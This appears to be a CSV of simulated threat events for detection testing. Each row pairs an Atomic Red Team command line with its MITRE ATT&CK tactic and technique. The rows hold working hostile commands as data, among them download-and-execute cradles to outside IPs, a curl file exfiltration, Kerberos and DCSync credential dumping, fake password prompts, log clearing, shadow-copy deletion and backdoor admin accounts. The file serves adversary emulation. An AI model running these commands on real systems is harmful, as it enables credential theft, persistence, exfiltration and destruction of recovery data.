id,simulation_type,enabled,dest,description,parent_process,process_path,process_name,process,mitre_tactic,mitre_technique,sources,time_delay_seconds
PROC-TE-59,Threat Event,TRUE,WKS59,Dump Kerberos Tickets from LSA using dumper.ps1 (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,C:\Windows\System32\powershell.exe Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1'),"Credential Access
Execution","OS Credential Dumping: LSA Secrets
Command and Scripting Interpreter: Windows Command Shell
Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.004/T1003.004.md,
PROC-TE-60,Threat Event,TRUE,WKS60,DCSync - Active Directory (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\Public\onedrive.exe,onedrive.exe,"C:\Windows\Public\onedrive.exe ""lsadump::dcsync /domain:example.com /user:joebob@example.com"" ""exit""","Credential Access
Execution","OS Credential Dumping: DCSync
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.006/T1003.006.md,
PROC-TE-61,Threat Event,TRUE,WKS61,Adfind Enumerate Active Directory Domain Controller Objects (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Users\Public\AdFind.exe,AdFind.exe,C:\Users\Public\AdFind.exe -sc dclist,"Discovery
Execution","Remote System Discovery
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md,
PROC-TE-62,Threat Event,TRUE,WKS62,Enumerate Active Directory Computers with Get-AdComputer (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,C:\Windows\System32\powershell.exe Get-AdComputer -Filter *,"Discovery
Execution","Remote System Discovery
Command and Scripting Interpreter: Windows Command Shell
Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md,
PROC-TE-63,Threat Event,TRUE,WKS63,Enumerate Active Directory Computers with ADSISearcher (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"C:\Windows\System32\powershell.exe ([adsisearcher]""objectcategory=computer"").FindAll(); ([adsisearcher]""objectcategory=computer"").FindOne()","Discovery
Execution","Remote System Discovery
Command and Scripting Interpreter: Windows Command Shell
Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md,
PROC-TE-64,Threat Event,TRUE,WKS64,Get-DomainController with PowerView (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"C:\Windows\System32\powershell.exe [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainController -verbose","Discovery
Execution","Remote System Discovery
Command and Scripting Interpreter: Windows Command Shell
Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md,
PROC-TE-65,Threat Event,TRUE,WKS65,Get-WmiObject to Enumerate Domain Controllers (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"C:\Windows\System32\powershell.exe try { get-wmiobject -class ds_computer -namespace root\directory\ldap -ErrorAction Stop }
catch { $_; exit $_.Exception.HResult }","Discovery
Execution","Remote System Discovery
Command and Scripting Interpreter: Windows Command Shell
Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md,
PROC-TE-66,Threat Event,TRUE,WKS66,Remote System Discovery - net group Domain Controller (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,"C:\Windows\System32\net.exe group /domain ""Domain controllers""","Discovery
Execution","Remote System Discovery
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md,
PROC-TE-67,Threat Event,TRUE,WKS67,Masquerading as Windows LSASS process (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,C:\Windows\System32\cmd.exe copy %SystemRoot%\System32\cmd.exe %SystemRoot%\Temp\lsass.exe,"Defense Evasion
Execution","Masquerading: Rename System Utilities
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md,
PROC-TE-68,Threat Event,TRUE,WKS68,File Extension Masquerading (Atomic Red Team),C:\Windows\System32\explorer.exe,C:\Users\joebob\AppData\Local\Temp\T1036.007\masquerading.pdf.exe,masquerading.pdf.exe,%temp%\T1036.007\masquerading.pdf.exe,Defense Evasion,Masquerading: Rename System Utilities,https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md,
PROC-TE-69,Threat Event,TRUE,WKS69,Copy a sensitive File over Administrative share with copy (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,C:\Windows\System32\cmd.exe copy \\\\192.168.4.19\C$\Windows\Temp\credentials.txt %TEMP%\credentials.txt,"Collection
Execution","Data from Network Shared Drive
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1039/T1039.md,
PROC-TE-70,Threat Event,TRUE,WKS70,Copy a sensitive File over Administrative share with Powershell (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"C:\Windows\System32\powershell.exe copy-item -Path ""\\\\192.168.4.19\C$\Windows\Temp\credentials.txt"" -Destination ""$Env:TEMP\credentials.txt""","Collection
Execution","Data from Network Shared Drive
Command and Scripting Interpreter: Windows Command Shell
Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1039/T1039.md,
PROC-TE-71,Threat Event,TRUE,WKS71,Add hourly cron job (Atomic Red Team),/bin/bash,/bin/bash,bash,"/bin/bash echo ""curl 193.19.194.14/jsgyt | sh"" > /etc/cron.hourly/persistme","Persistence
Execution","Scheduled Task/Job: Cron
Command and Scripting Interpreter: Unix Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.003/T1053.003.md,
PROC-TE-72,Threat Event,TRUE,WKS72,Add cron job to cron.d directory (Atomic Red Team),/bin/bash,/bin/bash,bash,"/bin/bash echo '*/5 * * * * root ""curl 193.19.194.14/jsgyt | sh""' > /etc/cron.d/persistme","Persistence
Execution","Scheduled Task/Job: Cron
Command and Scripting Interpreter: Unix Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.003/T1053.003.md,
PROC-TE-73,Threat Event,TRUE,WKS73,Add cron job via crontab command (Atomic Red Team),/bin/bash,/bin/bash,bash,"/bin/bash echo ""* * * * * /tmp/a.sh"" > /tmp/b.sh && crontab /tmp/b.sh","Persistence
Execution","Scheduled Task/Job: Cron
Command and Scripting Interpreter: Unix Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.003/T1053.003.md,
PROC-TE-74,Threat Event,TRUE,WKS74,Add cron job to /var/spool/cron/crontabs/ directory (Atomic Red Team),/bin/bash,/bin/bash,bash,"/bin/bash echo ""curl http://193.176.183.245/ahdytg | sh"" >> /var/spool/cron/crontabs/c","Persistence
Execution","Scheduled Task/Job: Cron
Command and Scripting Interpreter: Unix Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.003/T1053.003.md,
PROC-TE-75,Threat Event,TRUE,WKS75,Add startup script via schtasks.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\schtasks.exe,schtasks.exe,"C:\Windows\System32\schtasks.exe /create /tn ""T1053_005_OnStartup"" /sc onstart /ru system /tr ""cmd.exe /c calc.exe""","Persistence
Execution","Scheduled Task/Job: Scheduled Task
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.md,
PROC-TE-76,Threat Event,TRUE,MACPRO76,MacOS credential theft via osascript password prompt (v1 // Atomic Red Team),/bin/bash,/usr/bin/osascript,osascript,"/usr/bin/osascript -e 'tell app ""System Preferences"" to activate' -e 'tell app ""System Preferences"" to activate' -e 'tell app ""System Preferences"" to display dialog ""Software Update requires that you type your password to apply changes."" & return & return  default answer """" with icon 1 with hidden answer with title ""Software Update""'","Credential Access
Execution","Input Capture: GUI Input Capture
Command and Scripting Interpreter: Unix Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.002/T1056.002.md,
PROC-TE-77,Threat Event,TRUE,WKS77,Windows credential theft via GUI password prompt (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"C:\Windows\System32\powershell.exe $cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName);write-warning $cred.GetNetworkCredential().Password","Credential Access
Execution","Input Capture: GUI Input Capture
Command and Scripting Interpreter: Windows Command Shell
Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.002/T1056.002.md,
PROC-TE-78,Threat Event,TRUE,WKS78,MacOS credential theft via osascript password prompt (v2 // Atomic Red Team),/bin/bash,/bin/bash,bash,"/bin/bash PWD_SPOOF=$(osascript -e 'display dialog ""To perform a security update MacOS needs your passphrase."" with title ""MacOS Security Update"" default answer """" with icon stop with hidden answer');echo $PWD_SPOOF","Credential Access
Execution","Input Capture: GUI Input Capture
Command and Scripting Interpreter: Unix Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.002/T1056.002.md,
PROC-TE-79,Threat Event,TRUE,WKS79,Powershell XML download cradle (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass -noprofile ""$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('http://jjgytsf.xyz/apars');$Xml.command.a.execute | IEX""","Credential Access
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell
Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md,
PROC-TE-80,Threat Event,TRUE,WKS80,PowerShell fileless script execution - store and run base64 encoded payload in registry (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"powershell.exe reg.exe add ""HKEY_CURRENT_USER\Software\Classes\ATR"" /v ART /t REG_SZ /d ""U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI="" /f; iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\ATR').ART)))",Execution,"Command and Scripting Interpreter: PowerShell
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md,
PROC-TE-81,Threat Event,TRUE,WKS81,MacOS encoded Python script invoked via osascript (Atomic Red Team),/bin/bash,/usr/bin/osascript,osascript,"osascript -e ""do shell script ""echo ""import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEsdGltZW91dD0zKS5yZWFkKCk7Cg=='));"" | python &""""",Execution,"Command and Scripting Interpreter: AppleScript
Command and Scripting Interpreter: Python",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.002/T1059.002.md,
PROC-TE-82,Threat Event,TRUE,WKS82,Local group enumeration via net.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,net.exe localgroup,"Discovery
Execution","Permission Groups Discovery: Local Groups
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.002/T1069.002.md,
PROC-TE-83,Threat Event,TRUE,WKS83,Domain group enumeration via net.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,net.exe group /domain,"Discovery
Execution","Permission Groups Discovery: Domain Groups
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.002/T1069.002.md,
PROC-TE-84,Threat Event,TRUE,WKS84,Domain Enterprise Admins group enumeration via net.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,"net.exe group ""enterprise admins"" /domain","Discovery
Execution","Permission Groups Discovery: Domain Groups
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.002/T1069.002.md,
PROC-TE-85,Threat Event,TRUE,WKS85,Domain Admins group enumeration via net.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,"net.exe group ""domain admins"" /domain","Discovery
Execution","Permission Groups Discovery: Domain Groups
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.002/T1069.002.md,
PROC-TE-86,Threat Event,TRUE,WKS86,Enumerate Active Directory Groups with ADSISearcher (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"C:\Windows\System32\powershell.exe ([adsisearcher]""objectcategory=group"").FindAll(); ([adsisearcher]""objectcategory=group"").FindOne()","Discovery
Execution","Permission Groups Discovery: Domain Groups
Command and Scripting Interpreter: PowerShell
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.002/T1069.002.md,
PROC-TE-87,Threat Event,TRUE,WKS87,Clear System Eventlog with wevtutil (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\wevtutil.exe,wevtutil.exe,wevtutil cl System,"Defense Evasion
Execution","Indicator Removal on Host: Clear Windows Event Logs
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.001/T1070.001.md,
PROC-TE-88,Threat Event,TRUE,WKS88,Clear Security Eventlog with wevtutil (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\wevtutil.exe,wevtutil.exe,wevtutil cl Security,"Defense Evasion
Execution","Indicator Removal on Host: Clear Windows Event Logs
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.001/T1070.001.md,
PROC-TE-89,Threat Event,TRUE,WKS89,Mount a network share with net.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,net use c: \\\\192.168.1.5\toys,"Collection
Execution","Data from Network Shared Drive
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.005/T1070.005.md,
PROC-TE-90,Threat Event,TRUE,WKS90,Create a new local user with net.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,net user windowsvc /active:yes,"Valid Accounts: Local Accounts
Execution","Valid Accounts: Local Accounts
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.001/T1078.001.md,
PROC-TE-91,Threat Event,TRUE,WKS91,Set the password for a new local user with net.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,net user windowsvc abbc176,"Valid Accounts: Local Accounts
Execution","Valid Accounts: Local Accounts
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.001/T1078.001.md,
PROC-TE-92,Threat Event,TRUE,WKS92,Add a new local user to the Local Admins group with net.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,net localgroup Administrators windowsvc /add,"Valid Accounts: Local Accounts
Execution","Valid Accounts: Local Accounts
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.001/T1078.001.md,
PROC-TE-93,Threat Event,TRUE,WKS93,Add a new local user to the Remote Desktop Users (RDP) group with net.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,"net localgroup ""Remote Desktop Users"" windowsvc /add","Lateral Movement
Execution","Remote Services: Remote Desktop Protocol
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.001/T1078.001.md,
PROC-TE-94,Threat Event,TRUE,WKS94,Enable RDP connections via registry keys and reg.exe (v1 // Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\reg.exe,reg.exe,"reg add ""hklm\system\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f","Lateral Movement
Defense Evasion
Execution","Remote Services: Remote Desktop Protocol
Modify Registry
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.001/T1078.001.md,
PROC-TE-95,Threat Event,TRUE,WKS95,Enable RDP connections via registry keys and reg.exe (v2 // Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\reg.exe,reg.exe,"reg add ""hklm\system\CurrentControlSet\Control\Terminal Server"" /v ""AllowTSConnections"" /t REG_DWORD /d 0x1 /f","Lateral Movement
Defense Evasion
Execution","Remote Services: Remote Desktop Protocol
Modify Registry
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.001/T1078.001.md,
PROC-TE-96,Threat Event,TRUE,WKS96,Powershell download cradle (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"powershell.exe (New-Object System.Net.WebClient).DownloadFile(""http://193.176.183.245/ahdytg"", ""$env:TEMP\abcc.txt"")","Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: PowerShell
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md,
PROC-TE-97,Threat Event,TRUE,WKS97,Windows tool ingress via curl.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\curl.exe,curl.exe,curl.exe -k http://193.176.183.245/ahdytg -o c:\users\public\music\a.dll,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md,
PROC-TE-98,Threat Event,TRUE,WKS98,Windows file exfiltration via curl.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\curl.exe,curl.exe,curl.exe --upload-file c:\temp\a.7z http://193.176.183.245,"Exfiltration
Execution","Exfiltration Over Web Service
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md,
PROC-TE-99,Threat Event,TRUE,WKS99,Powershell IWR download cradle (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,powershell.exe iwr -URI http://193.176.183.245/ahdytg -Outfile C:\Users\joebob\Documents\c.exe,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: PowerShell
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md,
PROC-TE-100,Threat Event,TRUE,WKS100,Registry autorun persistence via reg.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\reg.exe,reg.exe,reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d calc.exe /f,"Persistence
Execution","Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1112/T1112.md,
PROC-TE-101,Threat Event,TRUE,WKS101,Add new domain user with net.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,"net user ""pcz134"" ""lQsia65"" /add /domain","Persistence
Execution","Valid Accounts: Domain Accounts
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1136.002/T1136.002.md,
PROC-TE-102,Threat Event,TRUE,WKS102,Add new domain user to Domain Admins group with net.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,"net group ""Domain Admins"" ""pcz134"" /add /domain","Privilege Escalation
Persistence
Execution","Valid Accounts: Domain Accounts
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1136.002/T1136.002.md,
PROC-TE-103,Threat Event,TRUE,WKS103,Discover domain trusts with nltest (v1 // Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\nltest.exe,nltest.exe,nltest /domain_trusts,"Discovery
Execution","Domain Trust Discovery
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1482/T1482.md,
PROC-TE-104,Threat Event,TRUE,WKS104,Discover domain trusts with nltest (v2 // Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\nltest.exe,nltest.exe,nltest /trusted_domains,"Discovery
Execution","Domain Trust Discovery
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1482/T1482.md,
PROC-TE-105,Threat Event,TRUE,WKS105,Delete volume shadow copies with wmic.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\wmic.exe,wmic.exe,wmic.exe shadowcopy delete,"Impact
Execution","Inhibit System Recovery
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.md,
PROC-TE-106,Threat Event,TRUE,WKS106,Wbadmin Delete Windows Backup Catalog (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\wbadmin.exe,wbadmin.exe,wbadmin delete catalog -quiet,"Impact
Execution","Inhibit System Recovery
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.md,
PROC-TE-107,Threat Event,TRUE,WKS107,Delete Volume Shadow Copies via WMI with PowerShell (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,powershell.exe Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();},"Impact
Execution","Inhibit System Recovery
Command and Scripting Interpreter: PowerShell
Command and Scripting Interpreter: Windows Command Shell
Windows Management Instrumentation",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.md,
PROC-TE-108,Threat Event,TRUE,WKS108,Service creation via sc.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\sc.exe,sc.exe,"sc.exe create onedrivesvc binPath= ""C:\Windows\Temp\onedrive.exe"" start=auto  type=interact","Persistence
Execution","Create or Modify System Process: Windows Service
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543.003/T1543.003.md,
PROC-TE-109,Threat Event,TRUE,WKS109,Service creation via powershell.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"powershell.exe New-Service -Name ""onedrivesvc"" -BinaryPathName ""C:\Windows\Temp\onedrive.exe""","Persistence
Execution","Create or Modify System Process: Windows Service
Command and Scripting Interpreter: PowerShell
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543.003/T1543.003.md,
PROC-TE-110,Threat Event,TRUE,WKS110,Persistence via Recycle bin and reg.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\reg.exe,reg.exe,"reg ADD ""HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command"" /ve /d ""calc.exe"" /f","Persistence
Defense Evasion
Execution","Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
Modify Registry
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md,
PROC-TE-111,Threat Event,TRUE,WKS111,Renamed CrackMapExec Pass the Hash (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Users\JoeBob\Documents\akc.exe,akc.exe,C:\Users\JoeBob\Documents\akc.exe %userdnsdomain% -u Administrator -H cc36cf7a8514893efccd3324464tkg1a -x whoami,"Lateral Movement
Execution","Use Alternate Authentication Material: Pass the Hash
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1550.002/T1550.002.md,
PROC-TE-112,Threat Event,TRUE,WKS112,Allow RDP (3389/TCP) through Windows firewall with netsh.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\netsh.exe,netsh.exe,"netsh advfirewall firewall add rule name=""windowsfirewallservice"" dir=in protocol=tcp localport=3389 action=allow profile=any","Defense Evasion
Execution","Impair Defenses: Disable or Modify System Firewall
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.004/T1562.004.md,
